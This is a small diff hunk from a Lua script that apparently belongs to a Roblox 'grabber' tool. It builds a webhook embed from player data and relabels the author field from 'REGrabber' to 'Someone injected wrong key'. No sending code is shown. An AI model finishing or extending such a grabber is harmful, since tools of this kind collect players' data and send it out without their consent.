@@ -35,7 +35,7 @@ local PlayerData = {
         ["embeds"] = {{
            
             ["author"] = {
-                ["name"] = "REGrabber "..rver, -- Grabber name and version
+                ["name"] = "Someone injected wrong key"..rver, -- Grabber name and version
             },
            
             ["title"] = PlayerName, -- Username/PlayerName
